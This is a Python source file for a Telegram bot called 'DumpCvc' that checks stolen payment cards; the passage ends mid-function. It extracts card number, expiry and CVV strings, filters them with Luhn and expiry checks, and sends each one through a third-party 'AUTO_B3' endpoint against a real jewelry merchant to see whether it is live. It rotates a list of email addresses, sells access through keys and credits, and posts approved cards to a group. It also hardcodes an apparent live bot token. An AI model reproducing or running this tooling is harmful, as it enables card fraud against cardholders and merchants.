import os
import json
import asyncio
import aiohttp
import re
import random
import secrets
from datetime import datetime
from typing import Optional, Dict, List, Union

# Configuration
BOT_TOKEN = "8468435407:AAG5hTBdGRKioJO9yyJoi2T8JgEIfjgIra8"
OWNER_ID = 6319579484
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
TARGET_GROUP_ID = "-4828878766"

# Database paths
DB_PATHS = {
    "users": "Database/User.json",
    "keys": "Database/Keys.json",
    "subscription": "Database/Subscription.json",
    "group": "Database/Group.json"
}


class Database:
    """Database manager for JSON files"""
    
    @staticmethod
    def init_databases():
        """Create database files if they don't exist"""
        os.makedirs("Database", exist_ok=True)
        
        for name, path in DB_PATHS.items():
            if not os.path.exists(path):
                if name == "group":
                    with open(path, 'w') as f:
                        json.dump([], f, indent=4)
                else:
                    with open(path, 'w') as f:
                        json.dump({}, f, indent=4)
                print(f"✓ Created {path}")
    
    @staticmethod
    def load(db_name: str):
        """Load data from database"""
        try:
            with open(DB_PATHS[db_name], 'r') as f:
                return json.load(f)
        except Exception as e:
            print(f"Error loading {db_name}: {e}")
            return {} if db_name != "group" else []
    
    @staticmethod
    def save(db_name: str, data):
        """Save data to database"""
        try:
            with open(DB_PATHS[db_name], 'w') as f:
                json.dump(data, f, indent=4)
        except Exception as e:
            print(f"Error saving {db_name}: {e}")


class CardChecker:
    """Card validation and checking utilities"""
    
    RESPONSE_MAP = [
        ['Nice! New payment method added', "Approved", "000: Approved"],
        ['Payment method successfully added', "Approved", "000: Approved"],
        ['Invalid postal code or street address', "Approved", "Invalid postal code or street address"],
        ['Gateway Rejected: avs', "Approved", "Gateway Rejected: avs"],
        ['avs: Gateway Rejected: avs', "Approved", "avs: Gateway Rejected: avs"],
        ['Insufficient Funds', "Approved", "2001: Insufficient Funds (51 : DECLINED)"],
        ['Approved', "Approved", "000: Approved"],
        ['Invalid postal code and cvv', "ccn", "Invalid postal code and cvv"],
        ['Card Issuer Declined CVV', "ccn", "Card Issuer Declined CVV"],
        ['Gateway Rejected: avs_and_cvv', "ccn", "Gateway Rejected: avs_and_cvv"],
        ['Gateway Rejected: cvv', "ccn", "Gateway Rejected: cvv"],
        ['CVV', "ccn", "Card Issuer Declined CVV"]
    ]
    
    EMAILS = [
        "elmaspro15@gmail.com",
        "ambotsaimo@gmail.com",
        "Kimberlypatterson422018@gmail.com",
        "secretariat.batodelarosa@gmail.com",
        "hatdogjonathan@gmail.com",
        "benjamin.little@gmail.com",
        "arlene.montgomery@gmail.com",
        "javier.hall@gmail.com"
    ]
    
    @staticmethod
    def luhn_check(card_number: str) -> bool:
        """Validate card number using Luhn algorithm"""
        try:
            card_number = card_number.replace(" ", "").replace("-", "")
            if not card_number.isdigit():
                return False
            
            digits = [int(d) for d in card_number]
            checksum = 0
            
            for i in range(len(digits) - 2, -1, -2):
                digits[i] *= 2
                if digits[i] > 9:
                    digits[i] -= 9
            
            checksum = sum(digits)
            return checksum % 10 == 0
        except:
            return False
    
    @staticmethod
    def is_expired(mm: str, yyyy: str) -> bool:
        """Check if card is expired"""
        try:
            month = int(mm)
            year = int(yyyy)
            
            if year < 100:
                year += 2000
            
            now = datetime.now()
            current_year = now.year
            current_month = now.month
            
            if year < current_year:
                return True
            elif year == current_year and month < current_month:
                return True
            
            return False
        except:
            return True
    
    @staticmethod
    def extract_cards(text: str) -> List[Dict]:
        """Extract card details from text"""
        cards = []
        pattern = r'(\d{15,16})\s*[|:;,\-/]\s*(\d{1,2})\s*[|:;,\-/]\s*(\d{2,4})\s*[|:;,\-/]\s*(\d{3,4})'
        matches = re.findall(pattern, text)
        
        for match in matches:
            cardno, mm, yyyy, cvv = match
            mm = mm.zfill(2)
            if len(yyyy) == 2:
                yyyy = f"20{yyyy}"
            cvv = cvv.zfill(3)
            
            cards.append({
                'cardno': cardno,
                'mm': mm,
                'yyyy': yyyy,
                'cvv': cvv
            })
        
        return cards
    
    @staticmethod
    async def get_bin_info(session: aiohttp.ClientSession, bin_number: str) -> Dict:
        """Get BIN information"""
        try:
            url = f"https://camhack.online/Bin/bin.php?bin={bin_number}"
            
            async with session.get(url, timeout=10) as resp:
                data = await resp.json()
                
                if data.get("bin"):
                    return {
                        "success": True,
                        "bin": data.get("bin", "------"),
                        "scheme": data.get("scheme", "------"),
                        "type": data.get("type", "------"),
                        "brand": data.get("brand", "------"),
                        "issuer": data.get("issuer", "------"),
                        "country": data.get("country", "------"),
                        "flag": data.get("flag", "------"),
                        "extra": data.get("extra", "------"),
                        "source": data.get("source", "------")
                    }
                else:
                    return {
                        "success": False,
                        "bin": "------",
                        "scheme": "------",
                        "type": "------",
                        "brand": "------",
                        "issuer": "------",
                        "country": "------",
                        "flag": "------",
                        "extra": "------",
                        "source": "------"
                    }
        except Exception as e:
            print(f"Error fetching BIN info: {e}")
            return {
                "success": False,
                "bin": "------",
                "scheme": "------",
                "type": "------",
                "brand": "------",
                "issuer": "------",
                "country": "------",
                "flag": "------",
                "extra": "------",
                "source": "------"
            }
    
    @staticmethod
    async def check_card(session: aiohttp.ClientSession, card: Dict) -> Dict:
        """Check card via API"""
        try:
            cardno = card['cardno']
            mm = card['mm']
            yyyy = card['yyyy']
            cvv = card['cvv']
            
            lista = f"{cardno}|{mm}|{yyyy}|{cvv}"
            email = random.choice(CardChecker.EMAILS)
            
            url = f"http://camhack.online/APIs/AUTO_B3.php?site=https://www.zmayjewelry.com&gmail={email}&lista={lista}"
            
            async with session.get(url, timeout=30) as resp:
                text = await resp.text()
                
                response_match = re.search(r'"Response":"([^"]*)"', text)
                if response_match:
                    response = response_match.group(1).replace('<br>', '').strip()
                    
                    # Check against response map
                    for msg, status, res in CardChecker.RESPONSE_MAP:
                        if msg.lower() in response.lower():
                            bin_number = cardno[:6]
                            bin_info = await CardChecker.get_bin_info(session, bin_number)
                            
                            return {
                                'lista': lista,
                                'msg': res,
                                'status': status,
                                'raw_response': response,
                                'success': True,
                                'bin_info': bin_info,
                                'error': False
                            }
                    
                    # No match found - dead card
                    bin_number = cardno[:6]
                    bin_info = await CardChecker.get_bin_info(session, bin_number)
                    
                    return {
                        'lista': lista,
                        'msg': response,
                        'status': 'Dead',
                        'raw_response': response,
                        'success': True,
                        'bin_info': bin_info,
                        'error': False
                    }
                else:
                    # No response pattern found
                    return {
                        'lista': lista,
                        'msg': 'No response pattern found',
                        'status': 'Error',
                        'raw_response': text[:200],
                        'success': False,
                        'bin_info': None,
                        'error': True,
                        'error_html': text
                    }
        except Exception as e:
            return {
                'lista': f"{card['cardno']}|{card['mm']}|{card['yyyy']}|{card['cvv']}",
                'msg': f'Request Error: {str(e)}',
                'status': 'Error',
                'raw_response': str(e),
                'success': False,
                'bin_info': None,
                'error': True,
                'error_html': f"<pre>Error: {str(e)}</pre>"
            }


class TelegramBot:
    """Advanced Telegram Bot with async support"""
    
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.offset = 0
        self.active_sessions = {}
    
    async def init_session(self):
        """Initialize aiohttp session"""
        if not self.session:
            self.session = aiohttp.ClientSession()
    
    async def close_session(self):
        """Close aiohttp session"""
        if self.session:
            await self.session.close()
    
    def register_user(self, user_id: int, first_name: str, username: str = ""):
        """Register user in database"""
        users = Database.load("users")
        user_key = str(user_id)
        
        if user_key not in users:
            users[user_key] = {
                "id": user_id,
                "first_name": first_name,
                "username": username,
                "Expiry": "0",
                "credits": 0,
                "joined_at": int(datetime.now().timestamp())
            }
            Database.save("users", users)
            return True
        return False
    
    async def send_msg(
        self,
        chat_id: Union[int, str],
        text: str,
        parse_mode: str = "HTML",
        reply_markup: Optional[Dict] = None,
        disable_web_page_preview: bool = True,
        reply_to_message_id: Optional[int] = None
    ) -> Optional[Dict]:
        """Send message to chat"""
        await self.init_session()
        
        payload = {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": disable_web_page_preview
        }
        
        if reply_markup:
            payload["reply_markup"] = json.dumps(reply_markup)
        
        if reply_to_message_id:
            payload["reply_to_message_id"] = reply_to_message_id
        
        try:
            async with self.session.post(f"{API_URL}/sendMessage", json=payload) as resp:
                result = await resp.json()
                if result.get("ok"):
                    return result.get("result")
                else:
                    print(f"Error sending message: {result.get('description')}")
                    return None
        except Exception as e:
            print(f"Exception in send_msg: {e}")
            return None
    
    async def send_document(
        self,
        chat_id: Union[int, str],
        document_content: str,
        filename: str,
        caption: str = ""
    ) -> Optional[Dict]:
        """Send document to chat"""
        await self.init_session()
        
        data = aiohttp.FormData()
        data.add_field('chat_id', str(chat_id))
        data.add_field('document', document_content.encode('utf-8'), filename=filename, content_type='text/plain')
        if caption:
            data.add_field('caption', caption)
        
        try:
            async with self.session.post(f"{API_URL}/sendDocument", data=data) as resp:
                result = await resp.json()
                if result.get("ok"):
                    return result.get("result")
                else:
                    print(f"Error sending document: {result.get('description')}")
                    return None
        except Exception as e:
            print(f"Exception in send_document: {e}")
            return None
    
    async def edit_msg(
        self,
        chat_id: Union[int, str],
        message_id: int,
        text: str,
        parse_mode: str = "HTML",
        reply_markup: Optional[Dict] = None,
        disable_web_page_preview: bool = True
    ) -> Optional[Dict]:
        """Edit message in chat"""
        await self.init_session()
        
        payload = {
            "chat_id": chat_id,
            "message_id": message_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": disable_web_page_preview
        }
        
        if reply_markup:
            payload["reply_markup"] = json.dumps(reply_markup)
        
        try:
            async with self.session.post(f"{API_URL}/editMessageText", json=payload) as resp:
                result = await resp.json()
                if result.get("ok"):
                    return result.get("result")
                else:
                    print(f"Error editing message: {result.get('description')}")
                    return None
        except Exception as e:
            print(f"Exception in edit_msg: {e}")
            return None
    
    async def answer_callback_query(
        self,
        callback_query_id: str,
        text: str = "",
        show_alert: bool = False
    ) -> bool:
        """Answer callback query"""
        await self.init_session()
        
        payload = {
            "callback_query_id": callback_query_id,
            "text": text,
            "show_alert": show_alert
        }
        
        try:
            async with self.session.post(f"{API_URL}/answerCallbackQuery", json=payload) as resp:
                result = await resp.json()
                return result.get("ok", False)
        except Exception as e:
            print(f"Exception in answer_callback_query: {e}")
            return False
    
    async def delete_msg(
        self,
        chat_id: Union[int, str],
        message_id: int
    ) -> bool:
        """Delete message from chat"""
        await self.init_session()
        
        payload = {
            "chat_id": chat_id,
            "message_id": message_id
        }
        
        try:
            async with self.session.post(f"{API_URL}/deleteMessage", json=payload) as resp:
                result = await resp.json()
                if result.get("ok"):
                    return True
                else:
                    print(f"Error deleting message: {result.get('description')}")
                    return False
        except Exception as e:
            print(f"Exception in delete_msg: {e}")
            return False
    
    async def download_file(self, file_id: str) -> Optional[str]:
        """Download file from Telegram"""
        await self.init_session()
        
        try:
            async with self.session.get(f"{API_URL}/getFile?file_id={file_id}") as resp:
                result = await resp.json()
                if not result.get("ok"):
                    return None
                
                file_path = result["result"]["file_path"]
            
            file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
            async with self.session.get(file_url) as resp:
                content = await resp.text()
                return content
        except Exception as e:
            print(f"Error downloading file: {e}")
            return None
    
    async def generate_invite_link(self, user_id: int) -> Optional[str]:
        """Generate a single-use invite link for user"""
        await self.init_session()
        
        unban_payload = {
            "chat_id": TARGET_GROUP_ID,
            "user_id": user_id,
            "only_if_banned": True
        }
        
        try:
            await self.session.post(f"{API_URL}/unbanChatMember", json=unban_payload)
        except:
            pass
        
        invite_payload = {
            "chat_id": TARGET_GROUP_ID,
            "member_limit": 1,
            "expire_date": int(datetime.now().timestamp()) + 120
        }
        
        try:
            async with self.session.post(f"{API_URL}/createChatInviteLink", json=invite_payload) as resp:
                result = await resp.json()
                if result.get("ok"):
                    return result["result"].get("invite_link")
                else:
                    print(f"Error creating invite link: {result.get('description')}")
                    return None
        except Exception as e:
            print(f"Exception in generate_invite_link: {e}")
            return None
    
    async def get_updates(self) -> List[Dict]:
        """Get updates from Telegram"""
        await self.init_session()
        
        payload = {
            "offset": self.offset,
            "timeout": 30
        }
        
        try:
            async with self.session.post(f"{API_URL}/getUpdates", json=payload) as resp:
                result = await resp.json()
                if result.get("ok"):
                    updates = result.get("result", [])
                    if updates:
                        self.offset = updates[-1]["update_id"] + 1
                    return updates
                return []
        except Exception as e:
            print(f"Exception in get_updates: {e}")
            return []
    
    async def handle_start(self, message: Dict):
        """Handle /start command"""
        user_id = message["from"]["id"]
        first_name = message["from"].get("first_name", "User")
        username = message["from"].get("username", "")
        chat_id = message["chat"]["id"]
        reply_to = message.get("message_id")
        
        is_new = self.register_user(user_id, first_name, username)
        
        if is_new:
            status_text = "✨ <b>New user registered!</b>"
        else:
            status_text = "👋 <b>Welcome back!</b>"
        
        welcome_text = f"""
{status_text}

<b>Hello {first_name}!</b>

✨ <u>Available Features</u>  
- Card Validation & Checking  
- Live Dump CC Dropper  

📌 Use <b>/cmds</b> to view all available commands.  

——————————————  
<b>⚡ Powered by DumpCvc 🗑️</b>
"""
        
        inline_keyboard = {
            "inline_keyboard": [
                [{"text": "📋 Commands", "callback_data": f"show_commands:{user_id}"}],
                [{"text": "ℹ️ About", "callback_data": f"about:{user_id}"}, 
                 {"text": "👤 Owner", "url": f"tg://user?id={OWNER_ID}"}]
            ]
        }
        
        await self.send_msg(chat_id, welcome_text, reply_markup=inline_keyboard, reply_to_message_id=reply_to)
    
    async def handle_cmds(self, message: Dict, edit_mode: bool = False, original_user_id: Optional[int] = None):
        """Handle /cmds command"""
        chat_id = message["chat"]["id"]
        user_id = original_user_id if original_user_id else message["from"]["id"]
        message_id = message.get("message_id")
        reply_to = message.get("message_id") if not edit_mode else None
        
        commands_text = """
<b>📋 Available Commands:</b>

<b>👤 User Commands:</b>
/start - Start the bot
/cmds - Show all commands
/b3 [card] - Check single card
/claim [key] - Claim a key
/info - Get your information
"""
        
        if user_id == OWNER_ID:
            commands_text += """
<b>🔑 Owner Commands:</b>
/chk - Check cards from file
/adgr [group_id] - Add group ID
/degr [group_id] - Delete group ID
/key [days]|[credits] - Generate key
/stats - Get bot statistics
/broadcast - Broadcast message
"""
            commands_text += "\n<i>✨ You have owner privileges!</i>"
        
        inline_keyboard = {
            "inline_keyboard": [
                [{"text": "🔙 Back", "callback_data": f"start:{user_id}"}]
            ]
        }
        
        if edit_mode and message_id:
            await self.edit_msg(chat_id, message_id, commands_text, reply_markup=inline_keyboard)
        else:
            await self.send_msg(chat_id, commands_text, reply_markup=inline_keyboard, reply_to_message_id=reply_to)
    
    async def handle_info(self, message: Dict):
        """Handle /info command"""
        user_id = message["from"]["id"]
        chat_id = message["chat"]["id"]
        reply_to = message.get("message_id")
        
        users = Database.load("users")
        user_key = str(user_id)
        
        if user_key not in users:
            await self.send_msg(chat_id, "❌ You are not registered! Use /start first.", reply_to_message_id=reply_to)
            return
        
        user_data = users[user_key]
        current_time = int(datetime.now().timestamp())
        
        first_name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "Not set")
        expiry_str = user_data.get("Expiry", "0")
        credits = user_data.get("credits", 0)
        joined_at = user_data.get("joined_at", 0)
        
        if joined_at:
            joined_date = datetime.fromtimestamp(joined_at).strftime("%d-%m-%Y %H:%M:%S")
        else:
            joined_date = "Unknown"
        
        if expiry_str != "0":
            try:
                expiry_date = datetime.strptime(expiry_str, "%d-%m-%Y")
                expiry = int(expiry_date.timestamp())
                
                if expiry > current_time:
                    status = "✅ Active"
                    days_left = (expiry - current_time) // (24 * 60 * 60)
                    expiry_info = f"{expiry_str} ({days_left} days left)"
                else:
                    status = "❌ Expired"
                    expiry_info = f"{expiry_str} (Expired)"
            except:
                status = "❌ Expired"
                expiry_info = "Invalid date"
        else:
            status = "❌ Not Active"
            expiry_info = "No subscription"
        
        if user_id == OWNER_ID:
            role = "👑 Owner"
        else:
            role = "👤 User"
        
        info_text = f"""
<b>📊 Your Information</b>

<b>👤 Name:</b> {first_name}  
<b>🆔 User ID:</b> <code>{user_id}</code>  
<b>📝 Username:</b> @{username if username != "Not set" else "Not set"}  
<b>🎭 Role:</b> {role}  

<b>📅 Subscription Status:</b> {status}  
<b>⏰ Expiry Date:</b> {expiry_info}  
<b>💰 Credits:</b> {credits}  

<b>📆 Joined:</b> {joined_date}
"""
        
        await self.send_msg(chat_id, info_text, reply_to_message_id=reply_to)
    
    async def handle_b3(self, message: Dict):
        """Handle /b3 command"""
        user_id = message["from"]["id"]
        chat_id = message["chat"]["id"]
        reply_to = message.get("message_id")
        
        users = Database.load("users")
        user_key = str(user_id)
        
        if user_key not in users:
            await self.send_msg(chat_id, "❌ You are not registered! Use /start first.", reply_to_message_id=reply_to)
            return
        
        user_data = users[user_key]
        current_time = int(datetime.now().timestamp())
        expiry_str = user_data.get("Expiry", "0")
        
        if expiry_str != "0":
            try:
                expiry_date = datetime.strptime(expiry_str, "%d-%m-%Y")
                expiry = int(expiry_date.timestamp())
            except:
                expiry = 0
        else:
            expiry = 0
        
        if expiry <= current_time:
            await self.send_msg(chat_id, "❌ You don't have an active subscription! Use /claim to activate.", reply_to_message_id=reply_to)
            return
        
        credits = user_data.get("credits", 0)
        if credits < 2:
            await self.send_msg(chat_id, f"❌ Insufficient credits! You need at least 2 credits.\n\n💰 Your credits: {credits}", reply_to_message_id=reply_to)
            return
        
        text = message["text"].strip()
        parts = text.split(maxsplit=1)
        
        if len(parts) < 2:
            await self.send_msg(chat_id, "❌ Usage: /b3 [card]\n\nExample: /b3 4100400063856895|05|2032|092", reply_to_message_id=reply_to)
            return
        
        card_text = parts[1]
        cards = CardChecker.extract_cards(card_text)
        
        if not cards:
            await self.send_msg(chat_id, "❌ Invalid card format! Use: cardno|mm|yyyy|cvv", reply_to_message_id=reply_to)
            return
        
        card = cards[0]
        
        if not CardChecker.luhn_check(card['cardno']):
            await self.send_msg(chat_id, "❌ Invalid card number (Luhn check failed)!", reply_to_message_id=reply_to)
            return
        
        if CardChecker.is_expired(card['mm'], card['yyyy']):
            await self.send_msg(chat_id, "❌ Card is expired!", reply_to_message_id=reply_to)
            return
        
        checking_msg = await self.send_msg(chat_id, "🔄 Checking your card...", reply_to_message_id=reply_to)
        
        result = await CardChecker.check_card(self.session, card)
        
        users[user_key]["credits"] = credits - 2
        Database.save("users", users)
        
        result_text = f"""
✅ <b>Card Checked Successfully!</b>

<code>{result['lista']}</code>
<b>Response:</b> {result['msg']}
<b>Status:</b> {result['status']}
"""
        
        if result.get('bin_info'):
            bin_info = result['bin_info']
            result_text += f"""
━━━━━━━━━━━━━━━━
<b>BIN Info:</b>
{bin_info['flag']} <b>Country:</b> {bin_info['country']}
💳 <b>Scheme:</b> {bin_info['scheme']}
🏦 <b>Issuer:</b> {bin_info['issuer']}
📇 <b>Type:</b> {bin_info['type']}
⭐ <b>Brand:</b> {bin_info['brand']}
"""
        
        result_text += f"\n💰 <b>Remaining Credits:</b> {users[user_key]['credits']}"
        
        if checking_msg:
            await self.delete_msg(chat_id, checking_msg["message_id"])
        
        await self.send_msg(chat_id, result_text, reply_to_message_id=reply_to)
    
    async def handle_claim(self, message: Dict):
        """Handle /claim command"""
        user_id = message["from"]["id"]
        chat_id = message["chat"]["id"]
        reply_to = message.get("message_id")
        
        text = message["text"].strip()
        parts = text.split(maxsplit=1)
        
        if len(parts) < 2:
            await self.send_msg(chat_id, "❌ Usage: /claim [key]\n\nExample: /claim ABC123DEF456", reply_to_message_id=reply_to)
            return
        
        key = parts[1].upper().strip()
        keys = Database.load("keys")
        
        if key not in keys:
            await self.send_msg(chat_id, "❌ Invalid key! This key does not exist.", reply_to_message_id=reply_to)
            return
        
        key_data = keys[key]
        
        if key_data["status"] == "Claimed":
            await self.send_msg(chat_id, "❌ This key has already been claimed!", reply_to_message_id=reply_to)
            return
        
        current_time = int(datetime.now().timestamp())
        if current_time > key_data["expiry"]:
            await self.send_msg(chat_id, "❌ This key has expired!", reply_to_message_id=reply_to)
            return
        
        keys[key]["status"] = "Claimed"
        keys[key]["claimed_by"] = user_id
        keys[key]["claimed_at"] = current_time
        Database.save("keys", keys)
        
        users = Database.load("users")
        user_key = str(user_id)
        
        if user_key in users:
            current_expiry_str = users[user_key].get("Expiry", "0")
            
            if current_expiry_str != "0":
                try:
                    current_expiry_date = datetime.strptime(current_expiry_str, "%d-%m-%Y")
                    current_expiry = int(current_expiry_date.timestamp())
                except:
                    current_expiry = 0
            else:
                current_expiry = 0
            
            if current_expiry > current_time:
                new_expiry = current_expiry + (key_data["days"] * 24 * 60 * 60)
            else:
                new_expiry = current_time + (key_data["days"] * 24 * 60 * 60)
            
            new_expiry_date = datetime.fromtimestamp(new_expiry).strftime("%d-%m-%Y")
            
            users[user_key]["Expiry"] = new_expiry_date
            users[user_key]["credits"] = users[user_key].get("credits", 0) + key_data["credits"]
            Database.save("users", users)
            
            total_credits = users[user_key]["credits"]
        else:
            new_expiry_date = "Unknown"
            total_credits = key_data["credits"]
        
        invite_link = await self.generate_invite_link(user_id)
        
        if invite_link:
            link_text = f"• <a href='{invite_link}'>Join DumpCvc Group (Valid for 2 minutes)</a>"
        else:
            link_text = "• Failed to generate invite link. Contact admin."
        
        success_msg = f"""
✅ <b>Key Claimed Successfully!</b>

<b>⏰ Days Added:</b> {key_data["days"]}
<b>💰 Credits Added:</b> {key_data["credits"]}
<b>📅 Your Expiry:</b> {new_expiry_date}
<b>💳 Total Credits:</b> {total_credits}

<b>🔗 Access Group:</b>
{link_text}
"""
        
        await self.send_msg(chat_id, success_msg, reply_to_message_id=reply_to)
    
    async def handle_chk(self, message: Dict):
        """Handle /chk command - Owner only"""
        user_id = message["from"]["id"]
        chat_id = message["chat"]["id"]
        reply_to = message.get("message_id")
        
        if user_id != OWNER_ID:
            await self.send_msg(chat_id, "❌ This command is only for the owner!", reply_to_message_id=reply_to)
            return
        
        if user_id in self.active_sessions and self.active_sessions[user_id].get('active'):
            await self.send_msg(chat_id, "❌ You already have an active checking session! Stop it first.", reply_to_message_id=reply_to)
            return
        
        file_content = None
        
        if "document" in message:
            document = message["document"]
            if document["file_name"].endswith('.txt'):
                file_content = await self.download_file(document["file_id"])
        elif "reply_to_message" in message:
            replied_msg = message["reply_to_message"]
            if "document" in replied_msg:
                document = replied_msg["document"]
                if document["file_name"].endswith('.txt'):
                    file_content = await self.download_file(document["file_id"])
        
        if not file_content:
            await self.send_msg(chat_id, "❌ Please attach or reply to a .txt file containing cards!", reply_to_message_id=reply_to)
            return
        
        cards = CardChecker.extract_cards(file_content)
        
        if not cards:
            await self.send_msg(chat_id, "❌ No valid cards found in the file!", reply_to_message_id=reply_to)
            return
        
        valid_cards = []
        for card in cards:
            if not CardChecker.luhn_check(card['cardno']):
                continue
            if CardChecker.is_expired(card['mm'], card['yyyy']):
                continue
            valid_cards.append(card)
        
        if not valid_cards:
            await self.send_msg(chat_id, f"❌ No valid cards found!\n\n📊 Total: {len(cards)}\n❌ All failed Luhn or expired", reply_to_message_id=reply_to)
            return
        
        session_text = """<b>Welcome To DumpCvc</b>
<b>Power Checked Cc Droper</b>

<b>• Your Check-in is started •</b>"""
        
        inline_keyboard = {
            "inline_keyboard": [
                [{"text": "💳 Current: Starting...", "callback_data": f"noop:{user_id}"}],
                [{"text": "📝 Response: Waiting...", "callback_data": f"noop:{user_id}"}],
                [{"text": "✅ Status: Initializing...", "callback_data": f"noop:{user_id}"}],
                [{"text": f"📊 Progress: 0/{len(valid_cards)}", "callback_data": f"noop:{user_id}"}],
                [{"text": "🛑 Stop Session", "callback_data": f"stop_session:{user_id}"}]
            ]
        }
        
        status_msg = await self.send_msg(chat_id, session_text, reply_markup=inline_keyboard)
        
        if not status_msg:
            return
        
        self.active_sessions[user_id] = {
            "active": True,
            "message_id": status_msg["message_id"],
            "chat_id": chat_id,
            "live_cards": [],
            "dead_cards": []
        }
        
        checked_count = 0
        live_count = 0
        dead_count = 0
        
        for idx, card in enumerate(valid_cards, 1):
            if user_id not in self.active_sessions or not self.active_sessions[user_id].get('active'):
                final_text = f"""<b>Welcome To DumpCvc</b>
<b>Power Checked Cc Droper</b>

<b>• Session Stopped by User •</b>

📊 Checked: {checked_count}/{len(valid_cards)} cards"""
                
                live_dead_keyboard = {
                    "inline_keyboard": [
                        [{"text": f"🟢 Live: {live_count}", "callback_data": f"get_live:{user_id}"}],
                        [{"text": f"🔴 Dead: {dead_count}", "callback_data": f"get_dead:{user_id}"}]
                    ]
                }
                
                await self.edit_msg(chat_id, status_msg["message_id"], final_text, reply_markup=live_dead_keyboard)
                return
            
            result = await CardChecker.check_card(self.session, card)
            checked_count += 1
            
            card_lista = result['lista']
            
            # Determine if card is live or dead
            if result['status'] in ['Approved', 'ccn']:
                live_count += 1
                self.active_sessions[user_id]['live_cards'].append(card_lista)
                emoji = "🟢"
                status_display = result['status']
            else:
                dead_count += 1
                self.active_sessions[user_id]['dead_cards'].append(card_lista)
                emoji = "🔴"
                status_display = "Dead"
            
            current_card = f"💳 Current: {card['cardno'][:4]}...{card['cardno'][-4:]}"
            response_text = f"📝 Response: {result['msg'][:30]}..."
            status_text = f"{emoji} Status: {status_display}"
            progress_text = f"📊 Progress: {checked_count}/{len(valid_cards)}"
            
            inline_keyboard = {
                "inline_keyboard": [
                    [{"text": current_card, "callback_data": f"noop:{user_id}"}],
                    [{"text": response_text, "callback_data": f"noop:{user_id}"}],
                    [{"text": status_text, "callback_data": f"noop:{user_id}"}],
                    [{"text": progress_text, "callback_data": f"noop:{user_id}"}],
                    [{"text": "🛑 Stop Session", "callback_data": f"stop_session:{user_id}"}]
                ]
            }
            
            session_text = """<b>Welcome To DumpCvc</b>
<b>Power Checked Cc Droper</b>

<b>• Your Check-in is in progress •</b>"""
            
            try:
                await self.edit_msg(chat_id, status_msg["message_id"], session_text, reply_markup=inline_keyboard)
            except:
                pass
            
            # Send to owner
            if result['status'] in ['Approved', 'ccn']:
                owner_emoji = "✅" if result['status'] == 'Approved' else "⚠️"
            else:
                owner_emoji = "❌"
            
            result_text = f"{owner_emoji} <code>{result['lista']}</code>\n<b>Response:</b> {result['msg']}\n<b>Status:</b> {result['status']}"
            
            if result.get('bin_info'):
                bin_info = result['bin_info']
                result_text += f"""

━━━━━━━━━━━━━━━━
<b>BIN Info:</b>
{bin_info['flag']} <b>Country:</b> {bin_info['country']}
💳 <b>Scheme:</b> {bin_info['scheme']}
🏦 <b>Issuer:</b> {bin_info['issuer']}
📇 <b>Type:</b> {bin_info['type']}
⭐ <b>Brand:</b> {bin_info['brand']}
"""
            
            await self.send_msg(chat_id, result_text)
            
            # Send only approved cards to group
            if result['status'] in ['Approved', 'ccn']:
                try:
                    group_text = f"🟢 <b>APPROVED</b>\n\n<code>{result['lista']}</code>\n<b>Response:</b> {result['msg']}"
                    
                    if result.get('bin_info'):
                        bin_info = result['bin_info']
                        group_text += f"""

━━━━━━━━━━━━━━━━
<b>BIN Info:</b>
{bin_info['flag']} <b>Country:</b> {bin_info['country']}
💳 <b>Scheme:</b> {bin_info['scheme']}
🏦 <b>Issuer:</b> {bin_info['issuer']}
📇 <b>Type:</b> {bin_info['type']}
⭐ <b>Brand:</b> {bin_info['brand']}
"""
                    
                    await self.send_msg(TARGET_GROUP_ID, group_text)
                except Exception as e:
                    print(f"Error sending to group: {e}")
            
            # Send error HTML to owner if there's an error
            if result.get('error'):
                try:
                    error_html = result.get('error_html', 'Unknown error')
                    await self.send_msg(chat_id, f"⚠️ <b>Request Error for card:</b>\n<code>{card_lista}</code>\n\n{error_html}")
                except:
                    pass
            
            await asyncio.sleep(1)
        
        final_text = f"""<b>Welcome To DumpCvc</b>
<b>Power Checked Cc Droper</b>

<b>• Session Completed Successfully •</b>

📊 Total Checked: {checked_count}/{len(valid_cards)} cards
✅ All cards processed!"""
        
        live_dead_keyboard = {
            "inline_keyboard": [
                [{"text": f"🟢 Live: {live_count}", "callback_data": f"get_live:{user_id}"}],
                [{"text": f"🔴 Dead: {dead_count}", "callback_data": f"get_dead:{user_id}"}]
            ]
        }
        
        await self.edit_msg(chat_id, status_msg["message_id"], final_text, reply_markup=live_dead_keyboard)
        
        # Keep session data for file generation
        self.active_sessions[user_id]['active'] = False
    
    async def handle_adgr(self, message: Dict):
        """Handle /adgr command"""
        user_id = message["from"]["id"]
        chat_id = message["chat"]["id"]
        reply_to = message.get("message_id")
        
        if user_id != OWNER_ID:
            await self.send_msg(chat_id, "❌ This command is only for the owner!", reply_to_message_id=reply_to)
            return
        
        text = message["text"].strip()
        parts = text.split(maxsplit=1)
        
        if len(parts) < 2:
            await self.send_msg(chat_id, "❌ Usage: /adgr [group_id]\n\nExample: /adgr -1001234567890", reply_to_message_id=reply_to)
            return
        
        try:
            group_id = parts[1]
            group_id_int = int(group_id)
        except ValueError:
            await self.send_msg(chat_id, "❌ Invalid group ID! Please provide a numeric ID.", reply_to_message_id=reply_to)
            return
        
        groups = Database.load("group")
        if not isinstance(groups, list):
            groups = []
        
        if group_id in groups:
            await self.send_msg(chat_id, f"⚠️ Group ID <code>{group_id}</code> already exists!", reply_to_message_id=reply_to)
            return
        
        groups.append(group_id)
        Database.save("group", groups)
        
        await self.send_msg(chat_id, f"✅ Group ID <code>{group_id}</code> added successfully!\n\n📊 Total groups: {len(groups)}", reply_to_message_id=reply_to)
    
    async def handle_degr(self, message: Dict):
        """Handle /degr command"""
        user_id = message["from"]["id"]
        chat_id = message["chat"]["id"]
        reply_to = message.get("message_id")
        
        if user_id != OWNER_ID:
            await self.send_msg(chat_id, "❌ This command is only for the owner!", reply_to_message_id=reply_to)
            return
        
        text = message["text"].strip()
        parts = text.split(maxsplit=1)
        
        if len(parts) < 2:
            await self.send_msg(chat_id, "❌ Usage: /degr [group_id]\n\nExample: /degr -1001234567890", reply_to_message_id=reply_to)
            return
        
        group_id = parts[1]
        
        groups = Database.load("group")
        if not isinstance(groups, list):
            groups = []
        
        if group_id not in groups:
